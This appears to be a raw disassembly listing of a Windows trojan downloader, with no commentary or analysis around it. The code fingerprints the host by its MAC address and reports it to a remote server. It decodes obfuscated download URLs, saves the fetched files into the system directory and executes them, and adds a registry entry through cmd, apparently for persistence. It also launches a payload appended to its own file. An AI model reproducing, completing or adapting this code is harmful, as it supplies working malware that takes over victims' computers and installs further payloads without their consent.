word_402858	dw 13Bh			; DATA XREF: .rdata:00402468o
		db 'GetCurrentProcessId',0
word_40286E	dw 1C0h			; DATA XREF: .rdata:00402464o
		db 'GetSystemTimeAsFileTime',0
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:004023F4o
		align 2
word_402896	dw 203h			; DATA XREF: .rdata:00402564o
		db 'PostQuitMessage',0
word_4028A8	dw 0C8h			; DATA XREF: .rdata:00402554o
		db 'EndPaint',0
		align 4
word_4028B4	dw 0Dh			; DATA XREF: .rdata:0040255Co
		db 'BeginPaint',0
		align 2
word_4028C2	dw 99h			; DATA XREF: .rdata:00402548o
		db 'DestroyWindow',0
word_4028D2	dw 8Eh			; DATA XREF: .rdata:00402558o
		db 'DefWindowProcA',0
		align 4
word_4028E4	dw 217h			; DATA XREF: .rdata:off_402540o
		db 'RegisterClassExA',0
		align 4
word_4028F8	dw 1B9h			; DATA XREF: .rdata:00402544o
		db 'LoadCursorA',0
word_402906	dw 1BDh			; DATA XREF: .rdata:00402560o
		db 'LoadIconA',0
word_402912	dw 1B5h			; DATA XREF: .rdata:0040254Co
		db 'LoadAcceleratorsA',0
word_402926	dw 1CAh			; DATA XREF: .rdata:00402550o
		db 'LoadStringA',0
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:00402408o
		align 10h
word_402940	dw 106h			; DATA XREF: .rdata:off_402538o
		db 'ShellExecuteA',0
aShell32_dll	db 'SHELL32.dll',0      ; DATA XREF: .rdata:0040241Co
word_40295C	dw 101h			; DATA XREF: .rdata:off_402530o
		db 'Netbios',0
aNetapi32_dll	db 'NETAPI32.dll',0     ; DATA XREF: .rdata:00402430o
		align 4
word_402974	dw 9Ah			; DATA XREF: .rdata:00402578o
		db 'InternetReadFile',0
		align 4
word_402988	dw 69h			; DATA XREF: .rdata:off_40256Co
		db 'InternetCloseHandle',0
word_40299E	dw 93h			; DATA XREF: .rdata:00402570o
		db 'InternetOpenUrlA',0
		align 2
word_4029B2	dw 92h			; DATA XREF: .rdata:00402574o
		db 'InternetOpenA',0
aWininet_dll	db 'WININET.dll',0      ; DATA XREF: .rdata:00402444o
		align 800h
_rdata		ends

; Section 3. (virtual address 00003000)
; Virtual size			: 000026A4 (   9892.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00003000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 403000h
dword_403000	dd 0			; DATA XREF: start+125o
		dd offset loc_403CD9
dword_403008	dd 0			; DATA XREF: start:loc_403BFAo
dword_40300C	dd 0			; DATA XREF: start+D6o
dword_403010	dd 4 dup(0)		; DATA XREF: start+D1o
___security_cookie dd 0BB40E64Eh	; DATA XREF: sub_401000+3r
					; .rdata:0040236Co ...
		align 10h
dword_403030	dd 1			; DATA XREF: start+B8r
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_403040(char *Dest)
sub_403040	proc near		; CODE XREF: sub_403180+24p

pncb		= _NCB ptr -3A0h
var_360		= byte ptr -360h
var_35F		= byte ptr -35Fh
var_260		= byte ptr -260h
var_25F		= byte ptr -25Fh
var_25E		= byte ptr -25Eh
var_25D		= byte ptr -25Dh
var_25C		= byte ptr -25Ch
var_25B		= byte ptr -25Bh
var_4		= dword	ptr -4
Dest		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		and	esp, 0FFFFFFF8h
		sub	esp, 3A0h
		mov	eax, ___security_cookie
		mov	[esp+3A0h+var_4], eax
		push	esi
		push	edi
		xor	eax, eax
		mov	ecx, 10h
		lea	edi, [esp+3A8h+pncb]
		rep stosd
		mov	ecx, 3Fh
		lea	edi, [esp+3A8h+var_360]
		rep stosd
		stosw
		stosb
		lea	ecx, [esp+3A8h+pncb]
		lea	eax, [esp+3A8h+var_360]
		push	ecx		; pncb
		mov	[esp+3ACh+pncb.ncb_command], 37h
		mov	[esp+3ACh+pncb.ncb_buffer], eax
		mov	[esp+3ACh+pncb.ncb_length], 0FFh
		call	Netbios
		test	al, al
		jnz	short loc_4030C6
		mov	al, [esp+3A8h+var_360]
		xor	esi, esi
		test	al, al
		jbe	short loc_4030DB

loc_4030A1:				; CODE XREF: sub_403040+84j
		mov	dl, [esp+esi+3A8h+var_35F]
		lea	eax, [esp+3A8h+pncb]
		push	eax		; pncb
		mov	[esp+3ACh+pncb.ncb_command], 32h
		mov	[esp+3ACh+pncb.ncb_lana_num], dl
		call	Netbios
		test	al, al
		jz	short loc_4030DB
		movzx	ecx, [esp+3A8h+var_360]
		inc	esi
		cmp	esi, ecx
		jl	short loc_4030A1

loc_4030C6:				; CODE XREF: sub_403040+55j
					; sub_403040+DAj
		movzx	eax, al
		mov	ecx, [esp+3A8h+var_4]
		call	sub_403A50
		pop	edi
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4030DB:				; CODE XREF: sub_403040+5Fj
					; sub_403040+7Aj
		mov	dl, [esp+3A8h+var_35F]
		xor	eax, eax
		mov	ecx, 10h
		lea	edi, [esp+3A8h+pncb]
		rep stosd
		lea	ecx, [esp+3A8h+pncb]
		lea	eax, [esp+3A8h+var_260]
		push	ecx		; pncb
		mov	[esp+3ACh+pncb.ncb_command], 33h
		mov	[esp+3ACh+pncb.ncb_lana_num], dl
		mov	word ptr [esp+3ACh+pncb.ncb_callname], 2Ah
		mov	[esp+3ACh+pncb.ncb_buffer], eax
		mov	[esp+3ACh+pncb.ncb_length], 258h
		call	Netbios
		test	al, al
		jnz	short loc_4030C6
		movzx	edx, [esp+3A8h+var_25B]
		movzx	eax, [esp+3A8h+var_25C]
		movzx	ecx, [esp+3A8h+var_25D]
		push	edx
		movzx	edx, [esp+3ACh+var_25E]
		push	eax
		movzx	eax, [esp+3B0h+var_25F]
		push	ecx
		movzx	ecx, [esp+3B4h+var_260]
		push	edx
		mov	edx, [ebp+Dest]
		push	eax
		push	ecx
		push	offset Format	; "%02X-%02X-%02X-%02X-%02X-%02X"
		push	edx		; Dest
		call	sprintf
		mov	ecx, [esp+3C8h+var_4]
		add	esp, 20h
		xor	eax, eax
		call	sub_403A50
		pop	edi
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_403040	endp

; ---------------------------------------------------------------------------
		db 0CCh
		dd 2 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_403180	proc near		; CODE XREF: sub_403930+44p

var_604		= byte ptr -604h
var_504		= byte ptr -504h
Dest		= byte ptr -404h
var_4		= dword	ptr -4

		sub	esp, 604h
		mov	eax, ___security_cookie
		push	esi
		mov	[esp+608h+var_4], eax
		push	offset unk_40216C
		call	sub_4037F0
		mov	esi, eax
		lea	eax, [esp+60Ch+var_604]
		push	eax		; Dest
		call	sub_403040
		lea	ecx, [esp+610h+var_604]
		push	ecx
		push	esi
		lea	edx, [esp+618h+Dest]
		push	offset aS?macS	; "%s?mac=%s"
		push	edx		; Dest
		call	sprintf
		add	esp, 18h
		push	offset dword_404298
		lea	eax, [esp+60Ch+Dest]
		push	eax
		lea	ecx, [esp+610h+var_504]
		call	sub_403200
		mov	ecx, [esp+608h+var_4]
		pop	esi
		call	sub_403A50
		add	esp, 604h
		retn
sub_403180	endp

; ---------------------------------------------------------------------------
		db 3 dup(0CCh)
		dd 3 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_403200	proc near		; CODE XREF: sub_403180+58p
					; sub_403860+2Ap ...

dwNumberOfBytesRead= dword ptr	4
lpBuffer	= dword	ptr  8

		push	ebp
		push	0		; dwFlags
		push	0		; lpszProxyBypass
		push	0		; lpszProxy
		push	0		; dwAccessType
		push	offset szAgent	; "RookIE/1.0"
		call	ds:InternetOpenA
		mov	ebp, eax
		test	ebp, ebp
		jz	short loc_403272
		mov	eax, [esp+4+dwNumberOfBytesRead]
		push	ebx		; hInternet
		push	esi
		push	0		; dwContext
		push	4000000h	; dwFlags
		push	0		; dwHeadersLength
		push	0		; lpszHeaders
		push	eax		; lpszUrl
		push	ebp		; hInternet
		call	ds:InternetOpenUrlA
		mov	ebx, ds:InternetCloseHandle
		mov	esi, eax
		test	esi, esi
		jz	short loc_40326D
		mov	edx, [esp+0Ch+lpBuffer]
		mov	eax, edx
		push	edi
		mov	[esp+10h+dwNumberOfBytesRead], 1
		lea	edi, [eax+1]

loc_403251:				; CODE XREF: sub_403200+56j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_403251
		sub	eax, edi
		lea	ecx, [esp+10h+dwNumberOfBytesRead]
		push	ecx		; lpdwNumberOfBytesRead
		dec	eax
		push	eax		; dwNumberOfBytesToRead
		push	edx		; lpBuffer
		push	esi		; hFile
		call	ds:InternetReadFile
		push	esi		; hInternet
		call	ebx ; InternetCloseHandle
		pop	edi

loc_40326D:				; CODE XREF: sub_403200+3Dj
		push	ebp		; hInternet
		call	ebx ; InternetCloseHandle
		pop	esi
		pop	ebx

loc_403272:				; CODE XREF: sub_403200+18j
		pop	ebp
		retn	8
sub_403200	endp

; ---------------------------------------------------------------------------
		dw 0CCCCh
		dd 2 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_403280(char *Filename, LPCSTR lpszUrl)
sub_403280	proc near		; CODE XREF: sub_403860+7Ap

Count		= dword	ptr -608h
var_604		= byte ptr -604h
Buffer		= byte ptr -504h
Str		= byte ptr -404h
var_4		= dword	ptr -4
lpszUrl		= dword	ptr  4

		sub	esp, 608h
		mov	eax, ___security_cookie
		push	ebx
		push	ebp
		push	esi
		push	edi
		mov	[esp+618h+var_4], eax
		push	0FFh		; uSize
		lea	eax, [esp+61Ch+Buffer]
		push	eax		; lpBuffer
		mov	ebx, ecx
		call	ds:GetSystemDirectoryA
		mov	esi, [esp+618h+lpszUrl]
		mov	eax, esi
		xor	edi, edi
		lea	edx, [eax+1]
		lea	esp, [esp+0]

loc_4032C0:				; CODE XREF: sub_403280+45j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_4032C0
		sub	eax, edx
		dec	eax
		test	eax, eax
		jle	short loc_4032DC
		mov	edi, edi

loc_4032D0:				; CODE XREF: sub_403280+5Aj
		cmp	byte ptr [eax+esi], 2Fh
		jz	short loc_4032DC
		inc	edi
		dec	eax
		test	eax, eax
		jg	short loc_4032D0

loc_4032DC:				; CODE XREF: sub_403280+4Cj
					; sub_403280+54j
		mov	eax, esi
		lea	edx, [eax+1]

loc_4032E1:				; CODE XREF: sub_403280+66j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_4032E1
		sub	eax, edx
		mov	ecx, eax
		lea	eax, [ecx-1]
		test	eax, eax
		jle	short loc_403317
		mov	edx, eax
		sub	edx, ecx
		add	edx, edi
		lea	edx, [esp+edx+618h+var_604]
		lea	ecx, [ecx+0]

loc_403300:				; CODE XREF: sub_403280+8Ej
		mov	cl, [eax+esi]
		cmp	cl, 2Fh
		jz	short loc_403312
		dec	eax
		mov	[edx], cl
		dec	edx
		test	eax, eax
		jg	short loc_403300
		jmp	short loc_403317
; ---------------------------------------------------------------------------

loc_403312:				; CODE XREF: sub_403280+86j
		mov	[esp+edi+618h+var_604],	0

loc_403317:				; CODE XREF: sub_403280+71j
					; sub_403280+90j
		lea	eax, [esp+618h+var_604]
		push	eax
		lea	ecx, [esp+61Ch+Buffer]
		push	ecx
		push	offset aSS_0	; "%s\\%s"
		push	ebx		; Dest
		call	sprintf
		add	esp, 10h
		push	0		; dwFlags
		push	0		; lpszProxyBypass
		push	0		; lpszProxy
		push	0		; dwAccessType
		push	offset szAgent	; "RookIE/1.0"
		call	ds:InternetOpenA
		mov	ebp, eax
		test	ebp, ebp
		jz	loc_4033DE
		push	0		; dwContext
		push	84000100h	; dwFlags
		push	0		; dwHeadersLength
		push	0		; lpszHeaders
		push	esi		; lpszUrl
		push	ebp		; hInternet
		call	ds:InternetOpenUrlA
		mov	esi, eax
		test	esi, esi
		jz	short loc_4033D7
		push	offset Mode	; "wb"
		push	ebx		; Filename
		mov	[esp+620h+Count], 1
		call	fopen
		mov	edi, eax
		add	esp, 8
		test	edi, edi
		jz	short loc_4033D0
		mov	eax, [esp+618h+Count]
		test	eax, eax
		jbe	short loc_4033C7
		mov	ebx, ds:InternetReadFile

loc_403392:				; CODE XREF: sub_403280+145j
		lea	edx, [esp+618h+Count]
		push	edx		; lpdwNumberOfBytesRead
		push	3FFh		; dwNumberOfBytesToRead
		lea	eax, [esp+620h+Str]
		push	eax		; lpBuffer
		push	esi		; hFile
		call	ebx ; InternetReadFile
		mov	ecx, [esp+618h+Count]
		push	edi		; File
		push	ecx		; Count
		lea	edx, [esp+620h+Str]
		push	1		; Size
		push	edx		; Str
		call	fwrite
		mov	eax, [esp+628h+Count]
		add	esp, 10h
		test	eax, eax
		ja	short loc_403392

loc_4033C7:				; CODE XREF: sub_403280+10Aj
		push	edi		; File
		call	fclose
		add	esp, 4

loc_4033D0:				; CODE XREF: sub_403280+102j
		push	esi		; hInternet
		call	ds:InternetCloseHandle

loc_4033D7:				; CODE XREF: sub_403280+E6j
		push	ebp		; hInternet
		call	ds:InternetCloseHandle

loc_4033DE:				; CODE XREF: sub_403280+C9j
		mov	ecx, [esp+618h+var_4]
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		call	sub_403A50
		add	esp, 608h
		retn	4
sub_403280	endp

; ---------------------------------------------------------------------------
		db 'ÌÌÌÌÌÌÌÌÌ¸HÖ',0
		dd 686E800h, 20A10000h,	89004030h, 0D6442484h, 848B0000h
		dd 0D64C24h, 4C8D5000h,	0C4680424h, 51004021h, 631E8h
		dd 0CC48300h, 40068h, 24948D00h, 244h, 0FF006A52h, 40204815h
		dd 24848D00h, 100h, 244C8D50h, 15FF5104h, 402000h, 948BC933h
		dd 12024h, 77167200h, 0FA8108h,	720000D0h, 77C9850Ch, 64FA8108h
		dd 760000D0h, 24148D0Ch, 4C15FF52h, 0EB004020h,	0FFF88309h
		dd 0C6850Fh, 8D560000h,	2442484h, 0C0680000h, 50004021h
		dd 5CFE8h, 83F08B00h, 0F68508C4h, 6A2274h, 0E856006Ah
		dd 5C8h, 0D0006856h, 8C8D0000h,	65824h,	51016A00h, 5ADE8h
		dd 1CC48300h, 592E856h,	548D0000h, 0BC680824h, 52004021h
		dd 58FE8h, 83F08B00h, 0F6850CC4h, 56573D74h, 0D00068h
		dd 24848D00h, 650h, 0E850016Ah,	56Ah, 6824948Bh, 8B0000D6h
		dd 10C483C2h, 9001788Dh, 8440088Ah, 56F975C9h, 6A50C72Bh
		dd 47E85201h, 83000005h, 565F10C4h, 537E8h, 248C8B00h
		dd 0D65Ch, 6A04C483h, 51006A00h, 4021B868h, 6A006A00h
		dd 2484C600h, 65Ch, 0D815FF00h,	5E004020h, 44248C8Bh, 0E80000D6h
		dd 4F0h, 0D648C481h, 0CCC30000h, 2 dup(0CCCCCCCCh), 144EC81h
		dd 20A10000h, 55004030h, 24B48B56h, 150h, 48248489h, 57000001h
		dd 0C24448Dh, 15FF5650h, 402000h, 0ED85E88Bh, 1BFh, 0A8840F00h
		dd 85000000h, 0A0840FFFh, 8D000000h, 510C244Ch,	4015FF55h
		dd 8B004020h, 2444F6F8h, 0E374100Ch, 3824548Dh,	4021EC68h
		dd 0FBE85200h, 83000004h, 0C08508C4h, 0A0BACD75h, 8B004047h
		dd 8AD62BC6h, 20C8808h,	75C98440h, 8DC68BF6h, 88A0150h
		dd 75C98440h, 88C22BF9h, 40479C88h, 24448D00h, 0A0685038h
		dd 68004047h, 4021B0h, 4046A068h, 444E800h, 4C8D0000h
		dd 68514824h, 4047A0h, 4021CC68h, 42A06800h, 2BE80040h
		dd 68000004h, 4042A0h, 5C24548Dh, 46A06852h, 0B9E80040h
		dd 83FFFFFDh, 58E92CC4h, 55FFFFFFh, 204415FFh, 8C8B0040h
		dd 14C24h, 5D5E5F00h, 3EBE8h, 44C48100h, 0C3000001h, 0CCCCCCCCh
		dd 168EC81h, 20A10000h,	56004030h, 24848957h, 16Ch, 19B9C033h
		dd 8D000000h, 0F308247Ch, 24448DABh, 646A5008h,	203815FFh
		dd 448A0040h, 0C0840824h, 824748Dh, 3D8B4874h, 40203Ch
		dd 56D7FF56h, 0F883D7FFh, 561D7405h, 70244C8Dh,	40220868h
		dd 93E85100h, 8D000003h, 52782454h, 0FFFE9BE8h,	10C483FFh
		dd 508DC68Bh, 498D01h, 8440088Ah, 2BF975C9h, 6748DC2h
		dd 3E8001h, 8C8BBE75h, 16C24h, 0E85E5F00h, 350h, 168C481h
		dd 0CCC30000h, 2 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_403710	proc near		; CODE XREF: WinMain(x,x,x,x)+1Cp
					; sub_403930+49p
		push	esi
		push	offset Parameters ; lpBuffer
		push	400h		; nBufferLength
		call	ds:GetCurrentDirectoryA
		push	400h		; nSize
		push	offset Filename	; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		push	offset aRb	; "rb"
		push	offset Filename	; Filename
		call	fopen
		mov	esi, eax
		add	esp, 8
		test	esi, esi
		jz	short loc_4037C2
		push	0		; Origin
		push	0D000h		; Offset
		push	esi		; File
		call	fseek
		push	offset dword_4047B8
		push	offset aS	; "%s"
		push	esi		; File
		call	fscanf
		push	esi		; File
		call	fclose
		mov	eax, offset dword_4047B8
		add	esp, 1Ch
		lea	edx, [eax+1]
		lea	esp, [esp+0]

loc_403780:				; CODE XREF: sub_403710+75j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_403780
		sub	eax, edx
		cmp	eax, 1
		jb	short loc_4037C2
		push	offset dword_4047B8
		push	offset Parameters
		push	offset aSS	; "%s\"%s\""
		push	offset Parameters ; Dest
		call	sprintf
		add	esp, 10h
		push	5		; nShowCmd
		push	0		; lpDirectory
		push	offset Parameters ; lpParameters
		push	offset File	; "explorer"
		push	0		; lpOperation
		push	0		; hwnd
		call	ds:ShellExecuteA

loc_4037C2:				; CODE XREF: sub_403710+39j
					; sub_403710+7Cj
		pop	esi
		retn
sub_403710	endp

; ---------------------------------------------------------------------------
		dd 3 dup(0CCCCCCCCh)
; DWORD	__stdcall aVl50(LPVOID)
aVl50@		db 'V‹50 @',0           ; DATA XREF: sub_403930+54o
		db 0E8h
		dd 0FFFFFE94h, 753068h,	0EBD6FF00h, 0CCCCCCF2h,	2 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_4037F0	proc near		; CODE XREF: sub_403180+18p
					; sub_403930+6Fp ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		push	ecx
		mov	eax, [esp+4+arg_0]
		push	esi
		push	eax
		push	offset aS	; "%s"
		push	offset Dest	; Dest
		call	sprintf
		mov	eax, offset Dest
		add	esp, 0Ch
		xor	ecx, ecx
		lea	esi, [eax+1]

loc_403813:				; CODE XREF: sub_4037F0+28j
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_403813
		sub	eax, esi
		mov	[esp+8+var_4], eax
		jz	short loc_40384D

loc_403822:				; CODE XREF: sub_4037F0+5Bj
		mov	dl, Dest[ecx]
		xor	dl, 4
		sub	dl, 5
		mov	eax, offset Dest
		mov	Dest[ecx], dl
		inc	ecx
		lea	esi, [eax+1]
		lea	ecx, [ecx+0]

loc_403840:				; CODE XREF: sub_4037F0+55j
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_403840
		sub	eax, esi
		cmp	ecx, eax
		jb	short loc_403822

loc_40384D:				; CODE XREF: sub_4037F0+30j
		mov	eax, offset Dest
		pop	esi
		pop	ecx
		retn
sub_4037F0	endp

; ---------------------------------------------------------------------------
		db 3 dup(0CCh)
		dd 2 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_403860	proc near		; CODE XREF: sub_403930+89p
					; sub_403930+D8p

arg_0		= byte ptr  4
arg_10000	= dword	ptr  10004h
arg_10008	= dword	ptr  1000Ch

		mov	eax, 10008h
		call	sub_403A90
		mov	eax, ___security_cookie
		push	ebx
		push	ebp
		push	esi
		mov	[esp+0Ch+arg_10000], eax
		mov	esi, ecx
		mov	ecx, [esp+0Ch+arg_10008]
		lea	eax, [esp+0Ch+arg_0]
		push	eax
		push	ecx
		mov	ecx, esi
		call	sub_403200
		push	0		; nShowCmd
		push	0		; lpDirectory
		push	0		; lpParameters
		push	esi		; lpFile
		push	0		; lpOperation
		push	0		; hwnd
		call	ds:ShellExecuteA
		lea	eax, [esp+0Ch+arg_0]
		xor	ebx, ebx
		xor	ebp, ebp
		lea	edx, [eax+1]
		jmp	short loc_4038B0
; ---------------------------------------------------------------------------
		db 8Dh,	49h, 0
; ---------------------------------------------------------------------------

loc_4038B0:				; CODE XREF: sub_403860+4Bj
					; sub_403860+55j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_4038B0
		sub	eax, edx
		mov	[esp+0Ch], eax
		jz	short loc_403912
		push	edi

loc_4038C0:				; CODE XREF: sub_403860+AFj
		mov	al, [esp+ebx+10h+arg_0]
		cmp	al, 7Ch
		jz	short loc_4038D1
		mov	ss:szUrl[ebp], al
		inc	ebp
		jmp	short loc_4038FC
; ---------------------------------------------------------------------------

loc_4038D1:				; CODE XREF: sub_403860+66j
		push	offset szUrl	; lpszUrl
		mov	ecx, esi	; Filename
		xor	ebp, ebp
		call	sub_403280
		push	ebp		; nShowCmd
		push	ebp		; lpDirectory
		push	ebp		; lpParameters
		push	esi		; lpFile
		push	ebp		; lpOperation
		push	ebp		; hwnd
		call	ds:ShellExecuteA
		xor	eax, eax
		mov	ecx, 3Fh
		mov	edi, offset szUrl
		rep stosd
		stosw
		stosb

loc_4038FC:				; CODE XREF: sub_403860+6Fj
		lea	eax, [esp+10h+arg_0]
		inc	ebx
		lea	edx, [eax+1]

loc_403904:				; CODE XREF: sub_403860+A9j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_403904
		sub	eax, edx
		cmp	ebx, eax
		jb	short loc_4038C0
		pop	edi

loc_403912:				; CODE XREF: sub_403860+5Dj
		mov	ecx, [esp+0Ch+arg_10000]
		pop	esi
		pop	ebp
		pop	ebx
		call	sub_403A50
		add	esp, 10008h
		retn	4
sub_403860	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		dw 0CCCCh
		dd 0CCCCCCCCh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403930	proc near		; CODE XREF: WinMain(x,x,x,x)+2Ap

Str		= byte ptr -1BCh
Parameters	= byte ptr -188h
var_108		= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		and	esp, 0FFFFFFF8h
		sub	esp, 1C0h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	ecx, 1Eh
		mov	esi, offset aCRegAddHkcuSof ; "/c reg add \"HKCU\\Software\\Microsoft\\Win"...
		lea	edi, [esp+1C8h+Parameters]
		push	0		; nShowCmd
		rep movsd
		push	0		; lpDirectory
		mov	[esp+1D0h+var_4], eax
		lea	eax, [esp+1D0h+Parameters]
		push	eax		; lpParameters
		push	offset aCmd	; "cmd"
		push	0		; lpOperation
		push	0		; hwnd
		movsw
		call	ds:ShellExecuteA
		call	sub_403180
		call	sub_403710
		push	0		; lpThreadId
		push	0		; dwCreationFlags
		push	0		; lpParameter
		push	offset aVl50@	; "V‹50	@"
		push	0		; dwStackSize
		push	0		; lpThreadAttributes
		call	ds:CreateThread
		push	eax		; hObject
		call	ds:CloseHandle
		push	offset aIQ00xxx7xl9?7l ; "i}}q;00xxx7xl9?7lpv0uphp7hjo"
		call	sub_4037F0
		push	offset aIQ00xxx7xl9?_0 ; "i}}q;00xxx7xl9?7lpv0lqb7sbs"
		call	sub_4037F0
		add	esp, 8
		push	eax
		lea	ecx, [esp+1CCh+var_108]
		call	sub_403860
		lea	ecx, [esp+1C8h+Str]
		push	ecx
		push	offset aIQ00xxx7xl9?_0 ; "i}}q;00xxx7xl9?7lpv0lqb7sbs"
		call	sub_4037F0
		add	esp, 4
		push	eax
		lea	ecx, [esp+1D0h+var_108]
		call	sub_403200
		lea	edx, [esp+1C8h+Str]
		push	offset SubStr	; "yes"
		push	edx		; Str
		call	strstr
		add	esp, 8
		test	eax, eax
		jz	short loc_403A0D
		push	offset aIQ00xxx7xl9?_0 ; "i}}q;00xxx7xl9?7lpv0lqb7sbs"
		call	sub_4037F0
		add	esp, 4
		push	eax
		lea	ecx, [esp+1CCh+var_108]
		call	sub_403860

loc_403A0D:				; CODE XREF: sub_403930+C1j
		mov	ecx, [esp+1C8h+var_4]
		call	sub_403A50
		pop	edi
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_403930	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_403A1F	proc near		; CODE XREF: sub_403A50:loc_403A59j

ms_exc		= CPPEH_RECORD ptr -18h

		push	8
		push	offset dword_4022F0
		call	__SEH_prolog
		and	[ebp+ms_exc.disabled], 0
		push	0
		push	1
		call	__security_error_handler
		pop	ecx
		pop	ecx
		jmp	short loc_403A43
; ---------------------------------------------------------------------------
		dd 0C340C033h
		db 8Bh,	65h, 0E8h
; ---------------------------------------------------------------------------

loc_403A43:				; CODE XREF: sub_403A1F+1Bj
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		push	3		; uExitCode
		call	ds:ExitProcess
sub_403A1F	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


sub_403A50	proc near		; CODE XREF: sub_401000+41p
					; sub_401000+75p ...
		cmp	ecx, ___security_cookie
		jnz	short loc_403A59
		retn
; ---------------------------------------------------------------------------

loc_403A59:				; CODE XREF: sub_403A50+6j
		jmp	sub_403A1F
sub_403A50	endp

; [00000006 BYTES: COLLAPSED FUNCTION sprintf. PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION fclose. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION fwrite. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION fopen. PRESS KEYPAD "+" TO EXPAND]
		dw 25FFh
		dd offset fread
; [00000006 BYTES: COLLAPSED FUNCTION fseek. PRESS KEYPAD "+" TO EXPAND]
		dw 0CCCCh
		dd 3 dup(0CCCCCCCCh)

; =============== S U B	R O U T	I N E =======================================


sub_403A90	proc near		; CODE XREF: sub_403860+5p

arg_0		= byte ptr  4

		cmp	eax, 1000h
		jnb	short loc_403AA5
		neg	eax
		add	eax, esp
		add	eax, 4
		test	[eax], eax
		xchg	eax, esp
		mov	eax, [eax]
		push	eax
		retn
; ---------------------------------------------------------------------------

loc_403AA5:				; CODE XREF: sub_403A90+5j
		push	ecx
		lea	ecx, [esp+4+arg_0]

loc_403AAA:				; CODE XREF: sub_403A90+2Cj
		sub	ecx, 1000h
		sub	eax, 1000h
		test	[ecx], eax
		cmp	eax, 1000h
		jnb	short loc_403AAA
		sub	ecx, eax
		mov	eax, esp
		test	[ecx], eax
		mov	esp, ecx
		mov	ecx, [eax]
		mov	eax, [eax+4]
		push	eax
		retn
sub_403A90	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0CCh
; [00000006 BYTES: COLLAPSED FUNCTION strstr. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION fscanf. PRESS KEYPAD "+" TO EXPAND]
; [000001FF BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

loc_403CD9:				; DATA XREF: .data:00403004o
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	eax, ___security_cookie
		test	eax, eax
		jz	short loc_403CEF
		cmp	eax, 0BB40E64Eh
		jnz	short locret_403D3D

loc_403CEF:				; CODE XREF: .data:00403CE6j
		push	esi
		lea	eax, [ebp-8]
		push	eax
		call	ds:GetSystemTimeAsFileTime
		mov	esi, [ebp-4]
		xor	esi, [ebp-8]
		call	ds:GetCurrentProcessId
		xor	esi, eax
		call	ds:GetCurrentThreadId
		xor	esi, eax
		call	ds:GetTickCount
		xor	esi, eax
		lea	eax, [ebp-10h]
		push	eax
		call	ds:QueryPerformanceCounter
		mov	eax, [ebp-0Ch]
		xor	eax, [ebp-10h]
		xor	esi, eax
		mov	___security_cookie, esi
		jnz	short loc_403D3C
		mov	___security_cookie, 0BB40E64Eh

loc_403D3C:				; CODE XREF: .data:00403D30j
		pop	esi

locret_403D3D:				; CODE XREF: .data:00403CEDj
		leave
		retn
; ---------------------------------------------------------------------------
		db 0CCh
; [00000006 BYTES: COLLAPSED FUNCTION __security_error_handler.	PRESS KEYPAD "+" TO EXPAND]
		dw 0CCCCh
; [0000003B BYTES: COLLAPSED FUNCTION __SEH_prolog. PRESS KEYPAD "+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __SEH_epilog. PRESS KEYPAD "+" TO	EXPAND]
dword_403D94	dd 20A425FFh, 25FF0040h, 402098h
					; DATA XREF: .rdata:___safe_se_handler_tableo
					; __SEH_prologo
; [00000006 BYTES: COLLAPSED FUNCTION _amsg_exit. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_403DA6	proc near		; CODE XREF: sub_403DCC+4p

arg_0		= dword	ptr  4

		cmp	dword_4056A0, 0FFFFFFFFh
		jnz	short loc_403DB5
		jmp	ds:_onexit
; ---------------------------------------------------------------------------

loc_403DB5:				; CODE XREF: sub_403DA6+7j
		push	offset dword_40569C
